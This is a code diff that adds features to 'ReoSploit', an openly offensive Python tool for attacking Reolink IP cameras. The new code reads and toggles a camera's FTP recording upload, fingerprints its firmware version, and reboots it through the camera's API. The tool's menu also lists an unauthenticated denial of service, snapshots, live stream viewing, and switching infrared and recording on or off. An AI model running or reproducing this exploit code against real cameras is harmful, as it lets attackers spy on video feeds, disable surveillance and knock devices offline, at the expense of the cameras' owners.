@@ -16,7 +16,7 @@ import time
 import cv2
 from scapy.all import *
 from prettytable import PrettyTable, DEFAULT
-actionchoices = ['scan', 'listen', 'token', 'enumerate', 'snap', 'dos', 'stream', 'infared', 'recording']
+actionchoices = ['scan', 'listen', 'token', 'enumerate', 'snap', 'dos', 'stream', 'infared', 'recording', 'ftp', 'version', 'reboot']
 def setargs():
         global args
         parser = argparse.ArgumentParser(description='Exploit Reolink Cameras.')
@@ -29,26 +29,29 @@ def setargs():
         args = parser.parse_args()
 
         if not args.ip or not args.action:
-                print("Error: Please specify an IP and Action! (E.g, ./reosploit.py --ip 192.168.1.10 --action dos)\n")
+                print("Usage: Please specify an IP and Action! (E.g, ./reosploit.py --ip 192.168.1.10 --action dos)\nUse --help for more info.\n")
                 x = PrettyTable()
-                x.field_names = ["Action", "Description", "Category", "Authentication"]
+                x.field_names = ["Action", "Description", "Authentication"]
                 # Enumeration
                 info(Style.BRIGHT + "Actions For Enumeration." + Style.RESET_ALL)
-                x.add_row(["Scan", "Discover local Reolink Devices.", "Enumeration", f"{Fore.RED}No{Fore.RESET}"])
-                x.add_row(["Listen", "Listen for Reolink Related Network Traffic.", "Enumeration", f"{Fore.RED}No{Fore.RESET}"])
-                x.add_row(["Enumerate", "Fully Enumerate information about the device..", "Enumeration", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Scan", "Discover local Reolink Devices.", f"{Fore.RED}No{Fore.RESET}"])
+                x.add_row(["Listen", "Listen for Reolink Related Network Traffic.", f"{Fore.RED}No{Fore.RESET}"])
+                x.add_row(["Enumerate", "Fully Enumerate information about the device.", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Version", "Get Reolink Version Target is Running", f"{Fore.RED}No{Fore.RESET}"])
                 x.align = 'l'; x.set_style(DEFAULT)
                 print(x, "\n")
                 # Exploitation
                 x = PrettyTable()
-                x.field_names = ["Action", "Description", "Category", "Authentication"]
+                x.field_names = ["Action", "Description", "Authentication"]
                 info(Style.BRIGHT + "Actions For Exploitation." + Style.RESET_ALL)
-                x.add_row(["Token", "Generate an API Authentication Token using Credentials.", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
-                x.add_row(["Snap", "Take a Photo through the Camera using the API.", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
-                x.add_row(["Stream", "Use CV2 + RTSP To Stream the Device's Video Feed", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
-                x.add_row(["Dos", "Significantly slow down or freeze the device.", "Exploitation", f"{Fore.RED}No{Fore.RESET}"])
-                x.add_row(["Infared", "Toggle the Infared Capabilities.", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
-                x.add_row(["Recording", "Toggle the Recording Capabilities", "Exploitation", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Token", "Generate an API Authentication Token using Credentials.", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Snap", "Take a Photo through the Camera using the API.", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Stream", "Use CV2 + RTSP To Stream the Device's Video Feed", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Dos", "Significantly slow down or freeze the device.", f"{Fore.RED}No{Fore.RESET}"])
+                x.add_row(["Infared", "Toggle the Infared Capabilities.", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Recording", "Toggle the Recording Capabilities", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Ftp", "Toggle FTP Recording Tranfers", f"{Fore.GREEN}Yes{Fore.RESET}"])
+                x.add_row(["Reboot", "Reboot the Target Device", f"{Fore.GREEN}Yes{Fore.RESET}"])
                 x.align = 'l'; x.set_style(DEFAULT)
                 print(x)
                 sys.exit()
@@ -119,13 +122,14 @@ def listen():
                         except KeyError:
                                 pass
 
+
 def gettoken(ip):
         if not args.u or not args.p:
                 info('A Username & Password for Authentication is Required for generating a Token!')
                 sys.exit()
         username = args.u
         passw = args.p
-        info("Generating a Token from " + ip + " for " + username + ":" + passw + "...")
+        info("Generating a Token from " + ip + " for " + username + ":" + '*' * len(passw) + "...")
         r = requests.post("http://" + ip + "/cgi-bin/api.cgi?cmd=Login&token=null", json=[{"cmd":"Login","action":0,"param":{"User":{"userName":username,"password":passw}}}])
         try:
                 token = json.loads(r.text)[0]["value"]["Token"]["name"]
@@ -274,7 +278,7 @@ def stream():
                 while(cap.isOpened()):
                         ret, frame = cap.read()
                         frame = cv2.resize(frame, (900, 900))
-                        cv2.imshow(f'ReoSploit Stream @ {args.ip}', frame)
+                        cv2.imshow(f'ReoSploit Stream [{args.ip}]', frame)
                         if cv2.waitKey(20) & 0xFF == ord('q'):
                                 break
         except KeyboardInterrupt:
@@ -320,6 +324,50 @@ def recording():
                 info("Failed. Error Code:", json.loads(r.text)[0]["value"]["rspCode"])
         sys.exit()
 
+def ftptoggle():
+        info('Getting Token To Authenticate To Toggle FTP Capabilities...')
+        token = gettoken(args.ip)
+        info('Getting Current FTP State...')
+        r = requests.post(f'http://{args.ip}/cgi-bin/api.cgi?cmd=GetFtp&token={token}', json=[{"cmd": "GetFtp", "action": 0, "param": {"channel": 0}}])
+        ftpjson = json.loads(r.text)
+        try:
+                info("FTP Information:\n")
+                print('Anonymous FTP\t\t:\t' + str(bool(ftpjson[0]['value']['Ftp']['anonymous'])))
+                print('\nFTP Username\t\t:\t' + ftpjson[0]['value']['Ftp']['userName'])
+                print('FTP Password Length\t:\t' + str(len(ftpjson[0]['value']['Ftp']['password'])) + ' Characters')
+                print('\nFTP Server\t\t:\t' + ftpjson[0]['value']['Ftp']['server'])
+                print('FTP Port\t\t:\t' + str(ftpjson[0]['value']['Ftp']['port']))
+                print('')
+
+                if ftpjson[0]['value']['Ftp']['schedule']['enable'] == 1:
+                        info('FTP Is Enabled. Disabling...')
+                        r = requests.post(f'http://{args.ip}/cgi-bin/api.cgi?cmd=GetFtp&token={token}', json=[{"cmd":"SetFtp","action":0,"param":{"Ftp":{"schedule":{"enable":0}}}}])
+                        if json.loads(r.text)[0]['value']['rspCode'] == 200:
+                                info('Success! FTP Is Disabled.')
+                elif ftpjson[0]['value']['Ftp']['schedule']['enable'] == 0:
+                        info('FTP Is Disabled. Enabling...')
+                        r = requests.post(f'http://{args.ip}/cgi-bin/api.cgi?cmd=GetFtp&token={token}', json=[{"cmd":"SetFtp","action":0,"param":{"Ftp":{"schedule":{"enable":1}}}}])
+                        if json.loads(r.text)[0]['value']['rspCode'] == 200:
+                                info('Success! FTP Is Enabled.')
+        except Exception as e:
+                info('Error: ' + str(e))
+
+def getversion():
+        info('Getting Reolink Version of Target...')
+        r = requests.get(f'http://' + args.ip + '/js/client.config.js')
+        try: version = json.loads(r.text.replace(';','').replace('var clientInfo = ',''))['version']; info('Reolink Version: ' + version)
+        except Exception as e: info('Error Getting Reolink Version. Error: ' + str(e) + r.text)
+
+def reboot():
+        info('Confirm - Are you sure you want to Reboot the Target Device?')
+        print(f'{Style.BRIGHT}[{green}Y{Fore.RESET}/{Fore.RED}N{Fore.RESET}]{Style.RESET_ALL} ',end='')
+        if input().upper() != 'Y': sys.exit()
+        else:
+                info('Rebooting Target Device...')
+                r = requests.post('http://' + args.ip + '/cgi-bin/api.cgi?cmd=Reboot&token=' + gettoken(args.ip), json=[{"cmd":"Reboot","action":0,"param":{}}])
+                if json.loads(r.text)[0]['value']['rspCode'] == 200: info('Success, Device should be Rebooting!')
+                else: info('Unable to Reboot Device.')
+
 if os.geteuid() != 0:
         info('Please run this as ROOT!')
         sys.exit()
@@ -331,14 +379,14 @@ green = '\u001b[38;5;118m'
 yellow = '\u001b[38;5;220m'
 cyan = '\u001b[38;5;51m'
 banner = fr'''
-{Style.BRIGHT}{Fore.BLUE}██████╗ ███████╗ ██████╗ {Fore.RED}███████╗██████╗ ██╗      ██████╗ ██╗████████╗
-{Fore.BLUE}██╔══██╗██╔════╝██╔═══██╗{Fore.RED}██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
-{Fore.BLUE}██████╔╝█████╗  ██║   ██║{Fore.RED}███████╗██████╔╝██║     ██║   ██║██║   ██║
-{Fore.BLUE}██╔══██╗██╔══╝  ██║   ██║{Fore.RED}╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║
-{Fore.BLUE}██║  ██║███████╗╚██████╔╝{Fore.RED}███████║██║     ███████╗╚██████╔╝██║   ██║
-{Fore.BLUE}╚═╝  ╚═╝╚══════╝ ╚═════╝ {Fore.RED}╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   {Fore.RESET}
-   -+  {yellow}Reosploit v1.2.0{Fore.RESET}  +-
---==[  {Fore.RED}{str(len(actionchoices))} Actions Loaded{Fore.RESET}  ]==--
+{Style.BRIGHT}{cyan}██████╗ ███████╗ ██████╗ {Fore.RED}███████╗██████╗ ██╗      ██████╗ ██╗████████╗
+{cyan}██╔══██╗██╔════╝██╔═══██╗{Fore.RED}██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
+{cyan}██████╔╝█████╗  ██║   ██║{Fore.RED}███████╗██████╔╝██║     ██║   ██║██║   ██║
+{cyan}██╔══██╗██╔══╝  ██║   ██║{Fore.RED}╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║
+{cyan}██║  ██║███████╗╚██████╔╝{Fore.RED}███████║██║     ███████╗╚██████╔╝██║   ██║
+{cyan}╚═╝  ╚═╝╚══════╝ ╚═════╝ {Fore.RED}╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   {Fore.RESET}
+   -+  {yellow}Reosploit v1.3.0{Fore.RESET}  +-
+--==[  {Fore.RED}{str(len(actionchoices))} Actions Loaded{Fore.RESET} ]==--
 --==[  {green}@SpicySoulsv{Fore.RESET}      ]==--
 --==[  {cyan}Beyond Root Sec{Fore.RESET}   ]==--
 {Style.RESET_ALL}'''
@@ -383,6 +431,12 @@ try:
                 infared()
         elif args.action == 'recording':
                 recording()
+        elif args.action == 'ftp':
+                ftptoggle()
+        elif args.action == 'version':
+                getversion()
+        elif args.action == 'reboot':
+                reboot()
 except KeyboardInterrupt:
         print("\nQuitting...")
         sys.exit()
